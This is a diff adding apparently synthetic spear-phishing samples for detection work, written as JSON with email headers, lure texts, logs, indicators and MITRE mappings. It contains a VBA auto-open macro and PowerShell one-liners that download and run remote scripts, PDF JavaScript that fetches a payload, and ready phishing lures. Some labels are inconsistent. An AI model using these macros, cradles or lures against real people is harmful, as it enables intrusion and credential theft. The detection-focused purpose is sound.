@@ -1,0 +1,324 @@
+{
+  "samples": [
+    {
+      "scenario": "Spear phishing email crafted to impersonate the HR director, targeting a senior manager with a malicious Excel attachment designed to steal Active Directory credentials and establish a reverse shell.",
+      "technical_data": {
+        "email_headers": "Return-Path: <hrdept@payr0ll-secure.com>\r\nReceived: from mail.payr0ll-secure.com (mail.payr0ll-secure.com [198.51.100.99])\r\n\tby mail.corporate.local (Postfix) with ESMTPS id 7A2D3B6789\r\n\tfor <senior.manager@corporate.local>; Tue, 20 Jun 2023 14:45:11 +0000 (UTC)\r\nReceived-SPF: pass (corporate.local: domain of hrdept@payr0ll-secure.com designates 198.51.100.99 as permitted sender)\r\nAuthentication-Results: mail.corporate.local; spf=pass smtp.mailfrom=payr0ll-secure.com; dkim=pass header.d=payr0ll-secure.com; dmarc=pass\r\nMessage-ID: <20230620144511.7A2D3B6789@mail.payr0ll-secure.com>\r\nFrom: \"HR Department\" <hrdept@payr0ll-secure.com>\r\nTo: senior.manager@corporate.local\r\nSubject: Updated Employee Benefits Summary - Action Required\r\nDate: Tue, 20 Jun 2023 14:45:11 +0000\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_Part_5678_098765\"\r\nX-Mailer: Microsoft Outlook 16.0\r\nX-Originating-IP: [203.0.114.55]\r\n",
+        "email_body_plain": "Dear Senior Manager,\n\nPlease find attached the updated employee benefits summary document. This update includes important changes to our health insurance plans.\n\nKindly review the document and acknowledge receipt by end of day.\n\nBest regards,\nHR Department\n",
+        "email_body_html": "<html><body><p>Dear Senior Manager,</p><p>Please find attached the updated employee benefits summary document. This update includes important changes to our health insurance plans.</p><p>Kindly review the document and acknowledge receipt by end of day.</p><p>Best regards,<br>HR Department</p></body></html>",
+        "attachment": {
+          "filename": "Employee_Benefits_2023-06-20.xlsm",
+          "md5": "b5d2e2f8a7c3e4d9f8a1b2c3d4e5f678",
+          "sha256": "a8e3a9f6c1b7d4e9f2a8c5b1d3e7f9a0c2d4b6e7f8a9c1d0b2e3f4a5c6d7e8f9",
+          "filetype": "Microsoft Excel Macro-Enabled Workbook",
+          "macro_code_snippet": "Private Sub Workbook_Open()\r\n  Dim shell As Object\r\n  Set shell = CreateObject(\"WScript.Shell\")\r\n  shell.Run \"cmd /c powershell -nop -w hidden -c \\\"IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.55/malware/reverse.ps1')\\\"\"\r\nEnd Sub"
+        },
+        "smtp_transaction_log": [
+          "220 mail.payr0ll-secure.com ESMTP Postfix",
+          "EHLO attackerhost.example.com",
+          "250-mail.payr0ll-secure.com",
+          "250-PIPELINING",
+          "250-SIZE 10240000",
+          "250-VRFY",
+          "250-ETRN",
+          "250-STARTTLS",
+          "250-AUTH PLAIN LOGIN",
+          "250-ENHANCEDSTATUSCODES",
+          "250-8BITMIME",
+          "250 DSN",
+          "MAIL FROM:<hrdept@payr0ll-secure.com>",
+          "250 2.1.0 Ok",
+          "RCPT TO:<senior.manager@corporate.local>",
+          "250 2.1.5 Ok",
+          "DATA",
+          "354 End data with <CR><LF>.<CR><LF>",
+          "[email content]",
+          ".",
+          "250 2.0.0 Ok: queued as 7A2D3B6789",
+          "QUIT",
+          "221 2.0.0 Bye"
+        ],
+        "dns_whois": {
+          "domain": "payr0ll-secure.com",
+          "registrant": "Domain Privacy Service, Inc.",
+          "registration_date": "2023-05-10T09:15:00Z",
+          "expiration_date": "2024-05-10T09:15:00Z",
+          "nameservers": [
+            "ns1.privatednsservice.com",
+            "ns2.privatednsservice.com"
+          ],
+          "registrar": "GoDaddy.com, LLC"
+        },
+        "url_obfuscation": "http://198.51.100.55/malware/reverse.ps1",
+        "network_packet_capture_excerpt": "Frame 3: 1514 bytes on wire (12112 bits), 1514 bytes captured (12112 bits)\nEthernet II, Src: 00:0c:29:84:7e:12, Dst: 00:50:56:c0:00:08\nInternet Protocol Version 4, Src: 192.168.2.15, Dst: 198.51.100.55\nTransmission Control Protocol, Src Port: 49876, Dst Port: 80, Seq: 1, Ack: 1\nHypertext Transfer Protocol\n    GET /malware/reverse.ps1 HTTP/1.1\r\n    Host: 198.51.100.55\r\n    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n    Accept: */*\r\n    Connection: Keep-Alive\r\n",
+        "endpoint_artifacts": {
+          "process_creation_log": "2023-06-20T14:47:05Z - Process created: C:\\Windows\\System32\\cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.55/malware/reverse.ps1')",
+          "registry_keys_modified": [
+            "HKCU\\Software\\Microsoft\\Office\\Excel\\Security\\Trusted Locations\\Location1 (added path to malware drop location)"
+          ],
+          "file_system_changes": [
+            "C:\\Users\\SeniorManager\\AppData\\Local\\Temp\\reverse.ps1 (created)"
+          ]
+        }
+      },
+      "indicators": {
+        "malicious_email_domain": "payr0ll-secure.com",
+        "attachment_hashes": {
+          "md5": "b5d2e2f8a7c3e4d9f8a1b2c3d4e5f678",
+          "sha256": "a8e3a9f6c1b7d4e9f2a8c5b1d3e7f9a0c2d4b6e7f8a9c1d0b2e3f4a5c6d7e8f9"
+        },
+        "malicious_urls": [
+          "http://198.51.100.55/malware/reverse.ps1"
+        ],
+        "smtp_origin_ip": "198.51.100.99",
+        "process_command_line": "cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.55/malware/reverse.ps1')"
+      },
+      "detection_method": "Advanced email filtering detected Excel macro-enabled attachment with obfuscated macro invoking PowerShell command to download and execute remote script. Network IDS raised alert on HTTP GET to suspicious IP not associated with corporate domains. Endpoint detection correlated process creation event with registry modifications and file system changes consistent with reverse shell payload execution. WHOIS data showed recent domain registration with privacy protection, indicating likely attacker infrastructure.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1059.001 - PowerShell",
+        "T1105 - Ingress Tool Transfer",
+        "T1566 - Phishing"
+      ]
+    },
+    {
+      "scenario": "Spear phishing attack targeting IT administrator with a crafted PDF invoice containing embedded JavaScript to exploit a vulnerability and install a remote access Trojan (RAT).",
+      "technical_data": {
+        "email_headers": "Return-Path: <billing@invo1ce-support.com>\r\nReceived: from mail.invo1ce-support.com (mail.invo1ce-support.com [203.0.114.88])\r\n\tby mail.corporate.local (Postfix) with ESMTPS id 4B9F123456\r\n\tfor <it.admin@corporate.local>; Fri, 23 Jun 2023 08:22:47 +0000 (UTC)\r\nReceived-SPF: pass (corporate.local: domain of billing@invo1ce-support.com designates 203.0.114.88 as permitted sender)\r\nAuthentication-Results: mail.corporate.local; spf=pass smtp.mailfrom=invo1ce-support.com; dkim=pass header.d=invo1ce-support.com; dmarc=pass\r\nMessage-ID: <20230623082247.4B9F123456@mail.invo1ce-support.com>\r\nFrom: \"Invoice Support\" <billing@invo1ce-support.com>\r\nTo: it.admin@corporate.local\r\nSubject: Invoice 7845123 - Payment Confirmation Required\r\nDate: Fri, 23 Jun 2023 08:22:47 +0000\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_Part_4321_123456\"\r\nX-Mailer: Adobe Acrobat 2020\r\nX-Originating-IP: [198.51.101.33]\r\n",
+        "email_body_plain": "Dear IT Administrator,\n\nPlease find attached the invoice for your recent purchase. Kindly review and confirm payment at your earliest convenience.\n\nThank you for your prompt attention.\n\nBest regards,\nInvoice Support Team\n",
+        "email_body_html": "<html><body><p>Dear IT Administrator,</p><p>Please find attached the invoice for your recent purchase. Kindly review and confirm payment at your earliest convenience.</p><p>Thank you for your prompt attention.</p><p>Best regards,<br>Invoice Support Team</p></body></html>",
+        "attachment": {
+          "filename": "Invoice_7845123.pdf",
+          "md5": "d7f8e9c0a2b3d4e5f6a7b8c9d0e1f234",
+          "sha256": "c5d7e39a8b1c4d5e6f7a8b9c0d1e2f3456789abcdef0123456789abcdef012345",
+          "filetype": "PDF Document",
+          "embedded_javascript_snippet": "this.exportDataObject({cName: \"payload.exe\", nLaunch: 2}); app.launchURL(\"http://198.51.101.33/malware/payload.exe\", true);"
+        },
+        "smtp_transaction_log": [
+          "220 mail.invo1ce-support.com ESMTP Postfix",
+          "EHLO attackerhost.example.net",
+          "250-mail.invo1ce-support.com",
+          "250-PIPELINING",
+          "250-SIZE 10240000",
+          "250-VRFY",
+          "250-ETRN",
+          "250-STARTTLS",
+          "250-AUTH PLAIN LOGIN",
+          "250-ENHANCEDSTATUSCODES",
+          "250-8BITMIME",
+          "250 DSN",
+          "MAIL FROM:<billing@invo1ce-support.com>",
+          "250 2.1.0 Ok",
+          "RCPT TO:<it.admin@corporate.local>",
+          "250 2.1.5 Ok",
+          "DATA",
+          "354 End data with <CR><LF>.<CR><LF>",
+          "[email content]",
+          ".",
+          "250 2.0.0 Ok: queued as 4B9F123456",
+          "QUIT",
+          "221 2.0.0 Bye"
+        ],
+        "dns_whois": {
+          "domain": "invo1ce-support.com",
+          "registrant": "Anonymous Registrant",
+          "registration_date": "2023-05-25T12:00:00Z",
+          "expiration_date": "2024-05-25T12:00:00Z",
+          "nameservers": [
+            "ns1.anonymousdns.com",
+            "ns2.anonymousdns.com"
+          ],
+          "registrar": "NameSilo, LLC"
+        },
+        "url_obfuscation": "http://198.51.101.33/malware/payload.exe",
+        "network_packet_capture_excerpt": "Frame 5: 1514 bytes on wire (12112 bits), 1514 bytes captured (12112 bits)\nEthernet II, Src: 00:0c:29:ab:cd:ef, Dst: 00:50:56:c0:00:08\nInternet Protocol Version 4, Src: 192.168.10.20, Dst: 198.51.101.33\nTransmission Control Protocol, Src Port: 49152, Dst Port: 80, Seq: 1, Ack: 1\nHypertext Transfer Protocol\n    GET /malware/payload.exe HTTP/1.1\r\n    Host: 198.51.101.33\r\n    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n    Accept: */*\r\n    Connection: Keep-Alive\r\n",
+        "endpoint_artifacts": {
+          "process_creation_log": "2023-06-23T08:25:30Z - Process created: C:\\Windows\\System32\\rundll32.exe C:\\Users\\ITAdmin\\AppData\\Local\\Temp\\payload.exe,EntryPoint",
+          "registry_keys_modified": [
+            "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Payload (added malicious persistence entry)"
+          ],
+          "file_system_changes": [
+            "C:\\Users\\ITAdmin\\AppData\\Local\\Temp\\payload.exe (created and executed)"
+          ]
+        }
+      },
+      "indicators": {
+        "malicious_email_domain": "invo1ce-support.com",
+        "attachment_hashes": {
+          "md5": "d7f8e9c0a2b3d4e5f6a7b8c9d0e1f234",
+          "sha256": "c5d7e39a8b1c4d5e6f7a8b9c0d1e2f3456789abcdef0123456789abcdef012345"
+        },
+        "malicious_urls": [
+          "http://198.51.101.33/malware/payload.exe"
+        ],
+        "smtp_origin_ip": "203.0.114.88",
+        "process_command_line": "rundll32.exe C:\\Users\\ITAdmin\\AppData\\Local\\Temp\\payload.exe,EntryPoint"
+      },
+      "detection_method": "Email security gateway identified PDF with embedded suspicious JavaScript exporting and launching executable payload. Network IDS detected HTTP GET request to suspicious IP address hosting known RAT payload. Endpoint protection logged anomalous rundll32.exe process creation and registry persistence modifications. WHOIS lookup revealed recently registered domain with privacy proxy, common in spear phishing infrastructure. Correlation of indicators triggered high severity alert for targeted credential theft attack.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1059.007 - JavaScript",
+        "T1110 - Brute Force (Credential Access)",
+        "T1566 - Phishing"
+      ]
+    },
+    {
+      "scenario": "Spear phishing targeting HR manager to exfiltrate employee PII by sending a fake internal survey link that harvests login credentials via a cloned SharePoint site.",
+      "technical_data": {
+        "email_headers": "Return-Path: <hr-dept@corp-secure-update.com>\r\nReceived: from mail.corp-secure-update.com (mail.corp-secure-update.com [198.51.100.77])\r\n\tby mail.corporate.local (Postfix) with ESMTPS id 7A2D6709876\r\n\tfor <hrmanager@corporate.local>; Tue, 20 Jun 2023 09:45:12 +0000 (UTC)\r\nReceived-SPF: pass (corporate.local: domain of hr-dept@corp-secure-update.com designates 198.51.100.77 as permitted sender)\r\nAuthentication-Results: mail.corporate.local; spf=pass smtp.mailfrom=corp-secure-update.com; dkim=pass header.d=corp-secure-update.com; dmarc=pass\r\nMessage-ID: <20230620094512.7A2D6709876@mail.corp-secure-update.com>\r\nFrom: \"Corporate HR Updates\" <hr-dept@corp-secure-update.com>\r\nTo: hrmanager@corporate.local\r\nSubject: Mandatory Employee Benefits Survey - Immediate Action Required\r\nDate: Tue, 20 Jun 2023 09:45:12 +0000\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=\"UTF-8\"\r\nX-Mailer: Microsoft Outlook 15.0\r\nX-Originating-IP: [203.0.114.18]\r\n",
+        "email_body_plain": "Dear HR Manager,\n\nAs part of our annual compliance update, please complete the mandatory employee benefits survey by following the link below. This survey is required to update and verify employee records.\n\nComplete Survey: http://203.0.114.18/login.aspx\n\nThank you for your prompt attention.\n\nBest regards,\nCorporate HR Updates\n",
+        "email_body_html": "<html><body><p>Dear HR Manager,</p><p>As part of our annual compliance update, please complete the mandatory employee benefits survey by following the link below. This survey is required to update and verify employee records.</p><p><a href=\"http://203.0.114.18/login.aspx\">Complete Survey</a></p><p>Thank you for your prompt attention.</p><p>Best regards,<br>Corporate HR Updates</p></body></html>",
+        "attachment": null,
+        "smtp_transaction_log": [
+          "220 mail.corp-secure-update.com ESMTP Postfix",
+          "EHLO attackerhost.example.net",
+          "250-mail.corp-secure-update.com",
+          "250-PIPELINING",
+          "250-SIZE 20480000",
+          "250-VRFY",
+          "250-ETRN",
+          "250-STARTTLS",
+          "250-AUTH PLAIN LOGIN",
+          "250-ENHANCEDSTATUSCODES",
+          "250-8BITMIME",
+          "250 DSN",
+          "MAIL FROM:<hr-dept@corp-secure-update.com>",
+          "250 2.1.0 Ok",
+          "RCPT TO:<hrmanager@corporate.local>",
+          "250 2.1.5 Ok",
+          "DATA",
+          "354 End data with <CR><LF>.<CR><LF>",
+          "[email content]",
+          ".",
+          "250 2.0.0 Ok: queued as 7A2D6709876",
+          "QUIT",
+          "221 2.0.0 Bye"
+        ],
+        "dns_whois": {
+          "domain": "corp-secure-update.com",
+          "registrant": "AnonPrivacy Ltd",
+          "registration_date": "2023-05-10T11:20:00Z",
+          "expiration_date": "2024-05-10T11:20:00Z",
+          "nameservers": [
+            "ns1.anondns.com",
+            "ns2.anondns.com"
+          ],
+          "registrar": "GoDaddy.com, LLC"
+        },
+        "url_obfuscation": "http://203.0.114.18/login.aspx",
+        "network_packet_capture_excerpt": "Frame 1: 1514 bytes on wire (12112 bits), 1514 bytes captured (12112 bits)\nEthernet II, Src: 00:0c:29:68:22:11, Dst: 00:50:56:c0:00:08\nInternet Protocol Version 4, Src: 192.168.2.15, Dst: 203.0.114.18\nTransmission Control Protocol, Src Port: 50234, Dst Port: 80, Seq: 1, Ack: 1\nHypertext Transfer Protocol\n    GET /login.aspx HTTP/1.1\r\n    Host: 203.0.114.18\r\n    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n    Accept: text/html\r\n    Connection: Keep-Alive\r\n",
+        "endpoint_artifacts": {
+          "process_creation_log": "2023-06-20T09:50:03Z - Process created: C:\\Program Files\\Mozilla Firefox\\firefox.exe http://203.0.114.18/login.aspx",
+          "registry_keys_modified": [
+            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\203.0.114.18 (added as trusted zone)"
+          ],
+          "file_system_changes": [
+            "C:\\Users\\HRManager\\AppData\\Local\\Temp\\survey_credentials.txt (created with harvested credentials)"
+          ]
+        }
+      },
+      "indicators": {
+        "malicious_email_domain": "corp-secure-update.com",
+        "attachment_hashes": null,
+        "malicious_urls": [
+          "http://203.0.114.18/login.aspx"
+        ],
+        "smtp_origin_ip": "198.51.100.77",
+        "process_command_line": "firefox.exe http://203.0.114.18/login.aspx"
+      },
+      "detection_method": "Email gateway detected phishing URL with newly registered domain mimicking internal HR system. Web proxy logs showed access to suspicious external IP hosting cloned login page. Endpoint detection alerted on new process creation opening external URL and file system artifacts with credential dumps. Correlation of domain registration with threat intel and URL reputation flagged high risk spear phishing campaign.",
+      "relevant_mitre_techniques": [
+        "T1566.002 - Spearphishing Link",
+        "T1204.002 - User Execution: Malicious Link",
+        "T1078 - Valid Accounts",
+        "T1537 - Transfer Data to Cloud Account",
+        "T1566 - Phishing"
+      ]
+    },
+    {
+      "scenario": "Spear phishing attack targeting IT administrator to deploy remote access trojan by sending a weaponized Excel document with embedded VBA macros disguised as critical patch release notes.",
+      "technical_data": {
+        "email_headers": "Return-Path: <it-support@patches-corp.com>\r\nReceived: from mail.patches-corp.com (mail.patches-corp.com [192.0.2.101])\r\n\tby mail.corporate.local (Postfix) with ESMTPS id 4F3A780B123\r\n\tfor <itadmin@corporate.local>; Wed, 05 Jul 2023 14:23:10 +0000 (UTC)\r\nReceived-SPF: pass (corporate.local: domain of it-support@patches-corp.com designates 192.0.2.101 as permitted sender)\r\nAuthentication-Results: mail.corporate.local; spf=pass smtp.mailfrom=patches-corp.com; dkim=pass header.d=patches-corp.com; dmarc=pass\r\nMessage-ID: <20230705142310.4F3A780B123@mail.patches-corp.com>\r\nFrom: \"IT Support Team\" <it-support@patches-corp.com>\r\nTo: itadmin@corporate.local\r\nSubject: Critical Security Patch Release Notes - Immediate Installation Required\r\nDate: Wed, 05 Jul 2023 14:23:10 +0000\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_Part_4321_098765\"\r\nX-Mailer: Microsoft Outlook 16.0\r\nX-Originating-IP: [198.51.100.88]\r\n",
+        "email_body_plain": "Dear IT Administrator,\n\nPlease find attached the release notes and installer for the critical security patch addressing recent vulnerabilities in our core infrastructure. Immediate installation is mandatory to maintain system integrity.\n\nIf you have questions, contact the IT Support Helpdesk.\n\nBest regards,\nIT Support Team\n",
+        "email_body_html": "<html><body><p>Dear IT Administrator,</p><p>Please find attached the release notes and installer for the critical security patch addressing recent vulnerabilities in our core infrastructure. Immediate installation is mandatory to maintain system integrity.</p><p>If you have questions, contact the IT Support Helpdesk.</p><p>Best regards,<br>IT Support Team</p></body></html>",
+        "attachment": {
+          "filename": "SecurityPatch_ReleaseNotes_2023-07-05.xlsm",
+          "md5": "d7a5f3c8b2e4f9a1c9e0b2d7a8f1e3c4",
+          "sha256": "e4f9b1d7c8a2b3e59f0d7c8a1e2b4f5a7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f",
+          "filetype": "Microsoft Excel Macro-Enabled Workbook",
+          "macro_code_snippet": "Private Sub Workbook_Open()\r\n  Dim shell As Object\r\n  Set shell = CreateObject(\"Wscript.Shell\")\r\n  shell.Run \"cmd /c powershell -NoProfile -WindowStyle Hidden -EncodedCommand JABjAD0AI...\" 'Encoded PowerShell command to download and execute RAT'\r\nEnd Sub"
+        },
+        "smtp_transaction_log": [
+          "220 mail.patches-corp.com ESMTP Postfix",
+          "EHLO attackerhost.malicious.net",
+          "250-mail.patches-corp.com",
+          "250-PIPELINING",
+          "250-SIZE 15360000",
+          "250-VRFY",
+          "250-ETRN",
+          "250-STARTTLS",
+          "250-AUTH PLAIN LOGIN",
+          "250-ENHANCEDSTATUSCODES",
+          "250-8BITMIME",
+          "250 DSN",
+          "MAIL FROM:<it-support@patches-corp.com>",
+          "250 2.1.0 Ok",
+          "RCPT TO:<itadmin@corporate.local>",
+          "250 2.1.5 Ok",
+          "DATA",
+          "354 End data with <CR><LF>.<CR><LF>",
+          "[email content]",
+          ".",
+          "250 2.0.0 Ok: queued as 4F3A780B123",
+          "QUIT",
+          "221 2.0.0 Bye"
+        ],
+        "dns_whois": {
+          "domain": "patches-corp.com",
+          "registrant": "Hidden Registrant Services",
+          "registration_date": "2023-06-15T08:45:00Z",
+          "expiration_date": "2024-06-15T08:45:00Z",
+          "nameservers": [
+            "ns1.hidden-dns.com",
+            "ns2.hidden-dns.com"
+          ],
+          "registrar": "NameSilo, LLC"
+        },
+        "url_obfuscation": "http://198.51.100.99/downloads/rat_payload.exe",
+        "network_packet_capture_excerpt": "Frame 12: 1514 bytes on wire (12112 bits), 1514 bytes captured (12112 bits)\nEthernet II, Src: 02:42:c0:a8:02:0b, Dst: 00:50:56:c0:00:09\nInternet Protocol Version 4, Src: 192.168.2.20, Dst: 198.51.100.99\nTransmission Control Protocol, Src Port: 56789, Dst Port: 80, Seq: 1, Ack: 1\nHypertext Transfer Protocol\n    GET /downloads/rat_payload.exe HTTP/1.1\r\n    Host: 198.51.100.99\r\n    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n    Accept: */*\r\n    Connection: Keep-Alive\r\n",
+        "endpoint_artifacts": {
+          "process_creation_log": "2023-07-05T14:27:45Z - Process created: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand JABjAD0AI... (download and execute RAT payload)",
+          "registry_keys_modified": [
+            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityPatchLoader (added to persist RAT)"
+          ],
+          "file_system_changes": [
+            "C:\\Users\\ITAdmin\\AppData\\Local\\Temp\\rat_payload.exe (created and executed)"
+          ]
+        }
+      },
+      "indicators": {
+        "malicious_email_domain": "patches-corp.com",
+        "attachment_hashes": {
+          "md5": "d7a5f3c8b2e4f9a1c9e0b2d7a8f1e3c4",
+          "sha256": "e4f9b1d7c8a2b3e59f0d7c8a1e2b4f5a7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f"
+        },
+        "malicious_urls": [
+          "http://198.51.100.99/downloads/rat_payload.exe"
+        ],
+        "smtp_origin_ip": "192.0.2.101",
+        "process_command_line": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand JABjAD0AI..."
+      },
+      "detection_method": "Email gateway sandbox detected Excel macro invoking encoded PowerShell command to download executable from suspicious IP. Network IDS identified HTTP GET request to rare IP address hosting malicious RAT payload. Endpoint monitoring logged process creation with encoded command line and persistence registry key addition. Domain registration data showed recent creation with privacy-protected registrant, correlating with threat intel on targeted IT administrator spear phishing attempts.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1059.001 - PowerShell",
+        "T1105 - Ingress Tool Transfer",
+        "T1547.001 - Registry Run Keys / Startup Folder",
+        "T1566 - Phishing"
+      ]
+    }
+  ]
+}
